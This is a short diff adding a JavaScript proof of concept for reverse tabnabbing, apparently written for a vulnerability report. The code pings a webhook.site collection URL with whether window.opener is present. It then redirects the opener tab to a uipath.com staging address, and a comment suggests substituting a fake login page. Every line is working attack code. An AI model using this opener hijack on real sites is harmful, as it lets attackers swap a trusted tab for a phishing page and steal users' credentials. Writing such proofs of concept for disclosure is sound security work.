@@ -1,0 +1,5 @@
+// Proof of concept - just log and redirect opener
+fetch('https://webhook.site/1745adb6-9637-4bdb-9bf0-1f1c497d81c4/poc?opener=' + !!window.opener);
+if (window.opener) {
+    window.opener.location = 'https://staging.uipath.com'; // or your fake login
+}
